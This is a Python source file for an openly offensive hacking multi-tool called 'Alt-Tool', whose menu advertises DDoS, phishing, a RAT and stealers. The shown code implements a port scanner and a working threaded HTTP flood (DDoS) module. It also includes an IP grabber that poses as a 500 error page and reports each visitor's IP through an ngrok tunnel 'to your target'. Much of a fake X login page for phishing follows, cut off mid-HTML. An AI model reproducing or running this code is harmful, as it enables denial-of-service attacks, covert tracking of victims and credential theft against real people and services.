import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import requests
import time
import sys
import discord
import asyncio
from flask import Flask, render_template_string, request, redirect, url_for, jsonify
from colorama import Fore, Style, init
from urllib.parse import urlparse
import ssl
from urllib.parse import quote
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import threading
import base64
import os
import socket
from flask import Flask, send_file
import PyInstaller.__main__
from pyngrok import ngrok, conf
from flask import Flask, request, jsonify, send_file
import subprocess
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from concurrent.futures import as_completed
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import string
from concurrent.futures import ThreadPoolExecutor
import json
from PyQt5.QtWidgets import *
from flask import Flask, request, jsonify
from PyQt5.QtCore import QTimer
import argparse
import queue
from urllib.parse import urljoin
import re




def print_violet_white_gradient(text, total_time=0.010):
    gradient = [(128, 0, 128), (255, 255, 255)]  
    gradient_step = 1.0 / (len(text) - 1)
    
    interval = total_time / len(text)

    for i in range(len(text)):
        ratio = i * gradient_step
        r = int(gradient[0][0] * (1 - ratio) + gradient[1][0] * ratio)
        g = int(gradient[0][1] * (1 - ratio) + gradient[1][1] * ratio)
        b = int(gradient[0][2] * (1 - ratio) + gradient[1][2] * ratio)

        sys.stdout.write(f"\033[38;2;{r};{g};{b}m{text[i]}")
        sys.stdout.flush()
        time.sleep(interval) 

    sys.stdout.write("\033[0m\n")

os.system('cls' if os.name == 'nt' else 'clear')
HackAltool = """
                              _____  .__   __          ___________           .__    ________  
                             /  _  \ |  |_/  |_        \__    ___/___   ____ |  |   \_____  \ 
                            /  /_\  \|  |\   __\  ______ |    | /  _ \ /  _ \|  |    /  ____/ 
                           /    |    \  |_|  |   /_____/ |    |(  <_> |  <_> )  |__ /       \ 
                           \____|__  /____/__|           |____| \____/ \____/|____/ \_______ |
                                   \/                                                       \/ 
                                                                                    
                 """

print_violet_white_gradient(HackAltool)

intro = """
    < [V] 2.2.1                                                     By AltWolf
    < [Creator] Team AltSad                                         Free Version !
    < [If you want something more powerful :]
    < [ https://beacons.ai/alttool ]
"""
print_violet_white_gradient(intro)
print(f""" {Fore.MAGENTA}        
                    
 ╔═══           Attack          ═══╗ ╔═══             Osint             ═══╗ ╔═══           Pentest             ═══╗ 
 {Fore.WHITE}║{Fore.LIGHTMAGENTA_EX}   ({Fore.WHITE}01{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Ip Info                ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}11{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Username Tracker           ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}21{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > XSS Search                 ║
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}02{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > DDOS Attack                  {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}12{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Phone tracker                    {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}22{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > SQL Search
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}03{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Link Grabber                 {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}13{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Email tracker                    {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}23{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Vulnerability Search
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}04{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Phishing Twitter             {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}14{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > ID tracker                       {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}24{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Scanner Web
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}05{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Phishing Instagram           {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}15{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Controleur Bot                   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}25{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Alt-Scan                    
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}06{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Mini Rat !                   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}16{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Metadata for image               {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}26{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Wifi-Scanner                 
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}07{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Nitro generator              {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}17{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Create Report                    {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}27{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > FireWall Search                
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}08{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Bot Deleter (discord)        {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}18{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Google Dork                      {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}28{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > File Scan                    
 ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}09{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Stealer (ngrok)              {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}19{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > TechInt (option)                 {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}29{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Update                    
 ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}10{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Stealer (Discord)      ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}20{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Directory Fuzzer           ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}30{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Contact                    ║ 
 {Fore.MAGENTA}╚═══                           ═══╝ ╚═══                               ═══╝ ╚═══                               ═══╝
""")
green = "\033[92m"
red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"

       
def Title(text):
    print(f"{white}{text}{reset}")

       
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.02)  
    print()

     
def gradient():
    for i in range(256):
        color = f"\033[38;5;{i}m" 
        time.sleep(0.05)  
    print()  

    


menu_choice = input(f"""{Fore.MAGENTA}
┌───({Fore.WHITE}AltWolf@altool{Fore.MAGENTA})─[{Fore.WHITE}~/1{Fore.MAGENTA}]                    
└──$  {Fore.WHITE}""")


green = "\033[92m"
red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"

      
def Title(text):
    print(f"{white}{text}{reset}")

        
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.02)  
    print()

        
def gradient():
    for i in range(256):
        color = f"\033[38;5;{i}m" 
        time.sleep(0.05) 
    print()  

if menu_choice == "":
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("python Alt-tool-Free.py")


def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        result = s.connect_ex((ip, port))
        s.close()
        if result == 0:
            return port
    except:
        pass
    return None

def scan_ports(ip, start_port, end_port):
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_port, ip, port) for port in range(start_port, end_port + 1)]
        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    return response.json()

def print_ip_info(data):
    print("\nIP Address Information:")
    print(f"    Country: {data.get('country', 'N/A')}")
    print(f"    Country Code: {data.get('countryCode', 'N/A')}")
    print(f"    Region: {data.get('regionName', 'N/A')}")
    print(f"    City: {data.get('city', 'N/A')}")
    print(f"    ZIP Code: {data.get('zip', 'N/A')}")
    print(f"    Latitude: {data.get('lat', 'N/A')}")
    print(f"    Longitude: {data.get('lon', 'N/A')}")
    print(f"    Timezone: {data.get('timezone', 'N/A')}")
    print(f"    ISP: {data.get('isp', 'N/A')}")
    print(f"    AS: {data.get('as', 'N/A')}")
    print(f"    IP Address: {data.get('query', 'N/A')}")

if menu_choice == "1":
    os.system('cls' if os.name == 'nt' else 'clear')
    sde = """
           :----------.                           
       .=-=---:.  .:-----:                        
     --==:              :=--                      
   .-==.                  .=-:                    
  .-=-                      -=-                   
 .-=-                        :=:                  
 --=                         .--.                 
.-=-                          :=:                 
.-=:                          :=-               Ip Info + Scan By AltWolf  
.-=:                          :=:                      Free Version
 --=                          --.                 
 --=:                        :=-                  
  --=:                      :=-                   
   -===                    -=-.                   
    .-==-               .-=-==                    
      .--==-:.      .:-==--=#*=:-                 
         .---========--:.   .-=***-               
              ..:...         -*###**-             
                               +####**-           
                                :*####*+=         
                                  =######+-       
                                    +######*-     
                                      *#####*:    
                                       :*####=    
                                          .:-.  
            """
    print_violet_white_gradient(sde)
    ip = input("Enter IP address: ")
    start_port = int(input("Enter starting port: "))
    end_port = int(input("Enter ending port: "))

    print(f"\nScanning open ports on {ip}...")
    open_ports = scan_ports(ip, start_port, end_port)

    if open_ports:
        print("\nOpen ports found:")
        for port in open_ports:
            print(f"Port {port} is open")
    else:
        print("\nNo open ports found.")

    print(f"\nRetrieving IP information for {ip}...")
    try:
        ip_info = get_ip_info(ip)
        if ip_info.get('status') == 'success':
            print_ip_info(ip_info)
        else:
            print(f"\nError: {ip_info.get('message', 'Unknown error')}")
    except Exception as e:
        print(f"\nError retrieving IP information: {e}")

    input("\nPress enter to continue...")
    time.sleep(1)
    os.system("python Alt-tool-Free.py")


if menu_choice == "2":
    os.system('cls' if os.name == 'nt' else 'clear')
    class RequestStats:
        def __init__(self):
            self.total = 0
            self.success = 0
            self.failed = 0
            self.response_times = []
            self.status_codes = defaultdict(int)
            self.lock = threading.Lock()
        
        def add_result(self, success, response_time, status_code):
            with self.lock:
                self.total += 1
                if success:
                    self.success += 1
                else:
                    self.failed += 1
                self.response_times.append(response_time)
                self.status_codes[status_code] += 1
        
        def get_stats(self):
            with self.lock:
                if not self.response_times:
                    return None
                
                sorted_times = sorted(self.response_times)
                return {
                    'total': self.total,
                    'success': self.success,
                    'failed': self.failed,
                    'avg_time': sum(self.response_times) / len(self.response_times),
                    'min_time': min(self.response_times),
                    'max_time': max(self.response_times),
                    'median_time': sorted_times[len(sorted_times) // 2],
                    'status_codes': dict(self.status_codes)
                }


    def create_optimized_session():
        session = requests.Session()
        
        adapter = HTTPAdapter(
            pool_connections=100,  
            pool_maxsize=100,      
            max_retries=0,        
            pool_block=False       
        )
        
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'UltraFastClient/2.0'
        })
        
        return session


    def generate_random_params():
        params = {
            'id': random.randint(1, 100000),
            'cache': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
            'ts': int(time.time() * 1000)
        }
        return params


    def send_burst_requests(url, method, stats, count, session, data_payload=None, randomize_params=False):
        for i in range(count):
            start_time = time.perf_counter()
            
            try:
                if method == 'GET':
                    params = generate_random_params() if randomize_params else None
                    response = session.get(url, params=params, timeout=5)
                elif method == 'POST':
                    response = session.post(url, json=data_payload, timeout=5)
                elif method == 'PUT':
                    response = session.put(url, json=data_payload, timeout=5)
                elif method == 'DELETE':
                    response = session.delete(url, timeout=5)
                elif method == 'PATCH':
                    response = session.patch(url, json=data_payload, timeout=5)
                else:
                    response = session.get(url, timeout=5)
                
                response_time = time.perf_counter() - start_time
                stats.add_result(True, response_time, response.status_code)
                
            except Exception as e:
                response_time = time.perf_counter() - start_time
                stats.add_result(False, response_time, 0)


    def get_flood_worker(url, stats, duration, randomize_params):
        session = create_optimized_session()
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time:
                start_time = time.perf_counter()
                
                try:
                    params = generate_random_params() if randomize_params else None
                    response = session.get(url, params=params, timeout=3)
                    response_time = time.perf_counter() - start_time
                    stats.add_result(True, response_time, response.status_code)
                except Exception as e:
                    response_time = time.perf_counter() - start_time
                    stats.add_result(False, response_time, 0)
        finally:
            session.close()


    def aggressive_worker(url, method, stats, requests_count, data_payload, randomize_params=False):
        session = create_optimized_session()
        
        try:
            send_burst_requests(url, method, stats, requests_count, session, data_payload, randomize_params)
        finally:
            session.close()


    def print_banner():
        ere = """
 ....................................
 :%+++++++++++++++++++++++++++++++%-.
 :%.                             .#-.
 :%.                             .#-.
 :%.                             .#-.
 :%.                             .#-.
 :%.                             .#-.    Dos by AltWolf
 :%.                             .#-.    Version V2.2.3
 :%.                             .#-.
 :%.                             .#-.
 :%.                             .#-.
 :%...............................#-.
 .-=============+%@%+=============-..
 ...            .*@#:.           .   
                .*@#:.               
         ...    .*@#:.   ...         
         .=@@@@@@@@@@@@@@@+.         
         .:===============:.         
         ...              .. 

        """
        print_violet_white_gradient(ere)

    def print_progress(stats, start_time):
        while True:
            time.sleep(0.5)
            current = stats.total
            elapsed = time.time() - start_time
            if elapsed > 0:
                rate = current / elapsed
                sys.stdout.write(f"\r Requêtes envoyées: {current} | Vitesse: {rate:.0f} req/s | Succès: {stats.success} | Échecs: {stats.failed}")
                sys.stdout.flush()


    def print_stats(stats, duration):
        result = stats.get_stats()
        
        if not result:
            print("\n Aucune statistique disponible")
            return
        
        print("                    STATISTIQUES FINALES")
        print(f"\n Résumé:")
        print(f"   • Total de requêtes  : {result['total']:,}")
        print(f"   • Succès             : {result['success']:,} ({result['success']/result['total']*100:.1f}%)")
        print(f"   • Échecs             : {result['failed']:,} ({result['failed']/result['total']*100:.1f}%)")
        print(f"   • Durée totale       : {duration:.2f}s")
        print(f"   • Requêtes/seconde   : {result['total']/duration:.0f} 🔥")
        
        print(f"\n Temps de réponse:")
        print(f"   • Minimum   : {result['min_time']*1000:.1f}ms")
        print(f"   • Maximum   : {result['max_time']*1000:.1f}ms")
        print(f"   • Moyenne   : {result['avg_time']*1000:.1f}ms")
        print(f"   • Médiane   : {result['median_time']*1000:.1f}ms")
        
        print(f"\nCodes de statut HTTP:")
        for code, count in sorted(result['status_codes'].items()):
            if code == 0:
                print(f"   • Erreurs réseau : {count:,}")
            else:
                print(f"   • {code}         : {count:,}")
        


    def generate_random_payload():
        payload = {
            'id': random.randint(1, 1000000),
            'data': ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
            'timestamp': int(time.time() * 1000),
            'random': ''.join(random.choices(string.ascii_letters, k=10)),
            'value': random.randint(1, 10000)
        }
        return payload


    def post_flood_worker(url, stats, duration, randomize_data, custom_payload):
        session = create_optimized_session()
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time:
                start_time = time.perf_counter()
                
                try:
                    data = generate_random_payload() if randomize_data else custom_payload
                    response = session.post(url, json=data, timeout=3)
                    response_time = time.perf_counter() - start_time
                    stats.add_result(True, response_time, response.status_code)
                except Exception as e:
                    response_time = time.perf_counter() - start_time
                    stats.add_result(False, response_time, 0)
        finally:
            session.close()


    def run_get_flood_mode():
        print("           MODE GET FLOOD ACTIVÉ")
        
        url = input(" URL cible: ").strip()
        if not url:
            print(" URL requise!")
            return 1
        
        threads_input = input(" Nombre de threads [100]: ").strip()
        num_threads = int(threads_input) if threads_input else 100
        
        duration_input = input("  Durée du flood en secondes [30]: ").strip()
        duration = int(duration_input) if duration_input else 30
        
        randomize = input(" Randomiser les paramètres GET? [O/n]: ").strip().lower()
        randomize_params = randomize != 'n'
        
        print(" Configuration GET FLOOD:")
        print(f"   • URL           : {url}")
        print(f"   • Threads       : {num_threads}")
        print(f"   • Durée         : {duration}s")
        print(f"   • Params random : {'OUI' if randomize_params else 'NON'}")
        print(f"   • Mode          : FLOOD CONTINU 🌊")
        
        confirm = input("\n LANCER LE GET FLOOD? [O/n]: ").strip().lower()
        if confirm and confirm != 'o':
            print(" Flood annulé")
            return 0
        
        stats = RequestStats()
        
        print(f"\nDÉMARRAGE DU GET FLOOD PENDANT {duration}s...\n")
        
        start_time = time.time()
        progress_thread = threading.Thread(target=print_progress, args=(stats, start_time), daemon=True)
        progress_thread.start()
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [
                executor.submit(get_flood_worker, url, stats, duration, randomize_params)
                for _ in range(num_threads)
            ]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        elapsed = time.time() - start_time
        print_stats(stats, elapsed)
        
        return 0


    def run_post_flood_mode():
        print("\n" + "="*60)
        print("           MODE POST FLOOD ACTIVÉ ")
        print("="*60 + "\n")
        
        url = input(" URL cible: ").strip()
        if not url:
            print(" URL requise!")
            return 1
        
        threads_input = input(" Nombre de threads [100]: ").strip()
        num_threads = int(threads_input) if threads_input else 100
        
        duration_input = input("⏱  Durée du flood en secondes [30]: ").strip()
        duration = int(duration_input) if duration_input else 30
        
        randomize = input(" Randomiser le payload JSON? [O/n]: ").strip().lower()
        randomize_data = randomize != 'n'
        
        custom_payload = {"attack": "post_flood", "timestamp": int(time.time())}
        
        if not randomize_data:
            use_custom = input(" Utiliser un payload personnalisé? [o/N]: ").strip().lower()
            if use_custom == 'o':
                print("Exemple: {\"test\": \"data\", \"value\": 123}")
                data_input = input("Données JSON: ").strip()
                if data_input:
                    import json
                    try:
                        custom_payload = json.loads(data_input)
                    except:
                        print(" JSON invalide, payload par défaut utilisé")
        
        print(" Configuration POST FLOOD:")
        print(f"   • URL           : {url}")
        print(f"   • Threads       : {num_threads} ")
        print(f"   • Durée         : {duration}s")
        print(f"   • Payload random: {'OUI' if randomize_data else 'NON'}")
        if not randomize_data:
            print(f"   • Payload       : {str(custom_payload)[:50]}...")
        print(f"   • Mode          : FLOOD CONTINU ")
        
        confirm = input("\n  LANCER LE POST FLOOD? [O/n]: ").strip().lower()
        if confirm and confirm != 'o':
            print(" Flood annulé")
            return 0
        
        stats = RequestStats()
        
        print(f"\n DÉMARRAGE DU POST FLOOD PENDANT {duration}s...\n")
        
        start_time = time.time()
        progress_thread = threading.Thread(target=print_progress, args=(stats, start_time), daemon=True)
        progress_thread.start()
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [
                executor.submit(post_flood_worker, url, stats, duration, randomize_data, custom_payload)
                for _ in range(num_threads)
            ]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        elapsed = time.time() - start_time
        print_stats(stats, elapsed)
        
        return 0


    def run_standard_mode():
        url = input(" URL du serveur: ").strip()
        if not url:
            print(" URL requise!")
            return 1
        
        print("\n Méthodes: GET, POST, PUT, DELETE, PATCH")
        method = input("Méthode HTTP [GET]: ").strip().upper() or "GET"
        
        threads_input = input("\n Nombre de threads [50]: ").strip()
        num_threads = int(threads_input) if threads_input else 50
        
        requests_input = input(" Nombre total de requêtes [10000]: ").strip()
        total_requests = int(requests_input) if requests_input else 10000
        
        randomize_params = False
        if method == 'GET':
            randomize = input(" Randomiser les paramètres GET? [o/N]: ").strip().lower()
            randomize_params = randomize == 'o'
        
        data_payload = None
        if method in ['POST', 'PUT', 'PATCH']:
            use_data = input("\n Utiliser un payload JSON? [o/N]: ").strip().lower()
            if use_data == 'o':
                print("Exemple: {\"test\": \"data\", \"value\": 123}")
                data_input = input("Données JSON: ").strip()
                if data_input:
                    import json
                    try:
                        data_payload = json.loads(data_input)
                    except:
                        print(" JSON invalide, payload vide utilisé")
                        data_payload = {"attack": "stress_test"}
                else:
                    data_payload = {"attack": "stress_test"}
            else:
                data_payload = {"attack": "stress_test"}
        
        print(" Configuration :")
        print(f"   • URL           : {url}")
        print(f"   • Méthode       : {method}")
        print(f"   • Threads       : {num_threads}")
        print(f"   • Requêtes      : {total_requests:,}")
        print(f"   • Req/thread    : {total_requests // num_threads:,}")
        if method == 'GET' and randomize_params:
            print(f"   • Params random : OUI ")
        print(f"   • Mode          : BURST")
        
        confirm = input("\n  ATTENTION: attack intensif! Lancer? [O/n]: ").strip().lower()
        if confirm and confirm != 'o':
            print(" Test annulé")
            return 0
        
        stats = RequestStats()
        requests_per_thread = total_requests // num_threads
        remaining_requests = total_requests % num_threads
        
        print(f"\n LANCEMENT DE L'ATTAQUE AVEC {num_threads} THREADS...\n")
        
        start_time = time.time()
        progress_thread = threading.Thread(target=print_progress, args=(stats, start_time), daemon=True)
        progress_thread.start()
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            
            for i in range(num_threads):
                req_count = requests_per_thread + (1 if i < remaining_requests else 0)
                future = executor.submit(aggressive_worker, url, method, stats, req_count, data_payload, randomize_params)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        duration = time.time() - start_time
        print_stats(stats, duration)
        
        return 0


    def main():
        print_banner()
        
        print("Modes disponibles:")
        print("   1. Mode Standard ")
        print("   2. Mode GET FLOOD ")
        print("   3. Mode POST FLOOD ")
        
        mode = input("\nChoisir le mode [1]: ").strip() or "1"
        
        if mode == "2":
            return run_get_flood_mode()
        elif mode == "3":
            return run_post_flood_mode()
        else:
            return run_standard_mode()


    if __name__ == "__main__":
        try:
            sys.exit(main())
        except KeyboardInterrupt:
            print("\n\n  Interruption")
            sys.exit(1)
        except Exception as e:
            print(f"\n Erreur: {e}")
            sys.exit(1)

if menu_choice == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        rez = """
     .....:-=====-:.....                   
    ...-+++=--::-====-...                  
 ...=*+:............-+-:..                
 ..-*+:................-=-...              
 .-#=...................:+-..              
 :*+.....................-=-.              
 =*:........... .........:==..             
 +*:......................==:.             
 =*:.....................:==:..            
 -#-:...................:-+-.              Link Grabber By AltWolf - AltSad
 .+#:::................::+=:.                       Version free
 ..+#-:::............::-++:..                      You need Ngrock
   .-%+:::::::::.:::::=*++=..              
    ..-#*=::...::::=+**+*+:+++:..          
      ...-+#%%%###*+:...*+##+=++...        
            ......      .*+#%*+=++..       
                        ..+*+%%*==**...    
                          ..+**%%*=+*+..   
                           ..:#**%#+=+*=...
                              .-#*#%#+=+#=.
                               ..+#+#%#+-..
                                 .:*#++..  
                                   .....  
        """
        print_violet_white_gradient(rez)
        app = Flask(__name__)

        def get_ip_info(ip):
            try:
                response = requests.get(f'http://ip-api.com/json/{ip}')
                return response.json()
            except:
                return None

        @app.route('/')
        def index():
            html_content = '''
            <!doctype html>
            <html>
            <head>
                <title>IP Info</title>
                <script>
                    async function getPublicIP() {
                        try {
                            let response = await fetch('https://api.ipify.org?format=json');
                            let data = await response.json();
                            fetch('/report_ip', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({ ip: data.ip })
                            });
                        } catch (error) {
                            console.error('Error fetching IP:', error);
                        }
                    }
                    window.onload = getPublicIP;
                </script>
            </head>
            <body>
                <h1>internal Server Error ( 500 )</h1>
            </body>
            </html>
            '''
            return render_template_string(html_content)

        @app.route('/report_ip', methods=['POST'])
        def report_ip():
            data = request.get_json()
            user_ip = data['ip']
            ip_info = get_ip_info(user_ip)

            print(f"User public IP address: {user_ip}")
            if ip_info:
                print("IP Address Information:")
                for key, value in ip_info.items():
                    print(f"{key}: {value}")
            else:
                print("Unable to retrieve IP information.")

            return jsonify({'status': 'success'})

        if __name__ == '__main__':
            ngrok_auth_token = input("Enter your ngrok authentication token: ")
            ngrok.set_auth_token(ngrok_auth_token)

            port = input("Enter the port to run Flask server: ")

            ngrok_tunnel = ngrok.connect(port)
            public_url = ngrok_tunnel.public_url
            print(f"Public tunnel available at: {public_url}")
            print("Send this URL to your target:")
            print(public_url)

            try:
                app.run(port=int(port))
            except KeyboardInterrupt:
                print("\nServer stopped.")
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")

if menu_choice == "4":
        os.system('cls' if os.name == 'nt' else 'clear')  
        gdgd = """
    .                     ..:=====-:..   ....  
   .-:.                  :============::-==:.  
   :==-..              .=================-..:. 
   -=====:.           .-===================-.  
   :========:..       .==================-..   
   .-===========-:.....=================-.     
    .:==================================-.     
   -=--=================================-.     
   :====================================:      
   .:==================================-.        Twitter Phishing by AltWolf
     .-================================.               Version V1.0.1
     ....:============================:.       
      .==============================:.        
       .:===========================.          
         ..-======================:.           
           ..-==================-..            
.........:====================-.               
 ..-=======================:..                 
     ..:--===========--:..                     
          ..........                 
        """
        print_violet_white_gradient(gdgd)
        app = Flask(__name__)

        html_contenta = '''
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Connectez-vous à X</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                    background: #2c3e50;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                }

                .modal {
                    background: #000;
                    border-radius: 16px;
                    width: 600px;
                    max-width: 90vw;
                    padding: 0;
                    position: relative;
                    max-height: 90vh;
                    overflow-y: auto;
                }

                .close-btn {
                    position: absolute;
                    top: 12px;
                    left: 12px;
                    background: none;
                    border: none;
                    color: #fff;
                    font-size: 20px;
                    cursor: pointer;
                    width: 36px;
                    height: 36px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    border-radius: 50%;
                    z-index: 10;
                }

                .close-btn:hover {
                    background: rgba(255, 255, 255, 0.1);
                }

                .logo {
                    display: flex;
                    justify-content: center;
                    padding: 20px;
                }

                .logo svg {
                    width: 40px;
                    height: 40px;
                    fill: #fff;
                }

                .content {
                    padding: 20px 80px 48px;
                }

                h1 {
                    color: #fff;
                    font-size: 31px;
                    font-weight: 700;
                    text-align: center;
                    margin-bottom: 36px;
                }

                .social-buttons {
                    display: flex;
                    flex-direction: column;
                    gap: 12px;
                    margin-bottom: 20px;
                }

                .social-btn {
                    width: 100%;
                    background: #fff;
                    border: 1px solid rgb(207, 217, 222);
                    border-radius: 9999px;
                    padding: 8px 24px;
                    color: #0f1419;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                    min-height: 40px;
                    transition: background 0.2s;
                }

                .social-btn:hover {
                    background: rgb(242, 242, 242);
                }

                .social-btn svg {
                    width: 20px;
                    height: 20px;
                }

                .divider {
                    display: flex;
                    align-items: center;
                    margin: 20px 0;
                    color: #fff;
                    font-size: 15px;
                }

                .divider::before,
                .divider::after {
                    content: '';
                    flex: 1;
                    height: 1px;
                    background: rgb(47, 51, 54);
                }

                .divider span {
                    padding: 0 16px;
                }

                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 20px;
                }

                .input-group {
                    position: relative;
                }

                input {
                    width: 100%;
                    background: #000;
                    border: 1px solid rgb(51, 54, 57);
                    border-radius: 4px;
                    padding: 18px 12px 8px;
                    color: #fff;
                    font-size: 17px;
                    transition: border-color 0.2s;
                }

                input::placeholder {
                    color: rgb(113, 118, 123);
                }

                input:focus {
                    outline: none;
                    border-color: rgb(29, 155, 240);
                }

                .login-btn {
                    width: 100%;
                    background: #fff;
                    border: none;
                    border-radius: 9999px;
                    padding: 12px 24px;
                    color: #0f1419;
                    font-size: 17px;
                    font-weight: 700;
                    cursor: pointer;
                    min-height: 52px;
                    transition: background 0.2s;
                }

                .login-btn:hover {
                    background: rgb(215, 219, 220);
                }

                .forgot-password {
                    background: none;
                    border: 1px solid rgb(51, 54, 57);
                    border-radius: 9999px;
                    padding: 12px 24px;
                    color: #fff;
                    font-size: 17px;
                    font-weight: 700;
                    cursor: pointer;
                    min-height: 52px;
                    transition: background 0.2s;
                }

                .forgot-password:hover {
                    background: rgba(255, 255, 255, 0.03);
                }

                .signup-section {
                    color: rgb(113, 118, 123);
                    font-size: 15px;
                    margin-top: 40px;
                }

                .signup-section a {
                    color: rgb(29, 155, 240);
                    text-decoration: none;
                }

                .signup-section a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <div class="modal">
                <button class="close-btn">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                        <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"/>
                    </svg>
                </button>

                <div class="logo">
                    <svg viewBox="0 0 24 24">
                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                    </svg>
                </div>

                <div class="content">
                    <h1>Connectez-vous à X</h1>

                    <div class="social-buttons">
                        <button class="social-btn">
                            <svg viewBox="0 0 24 24">
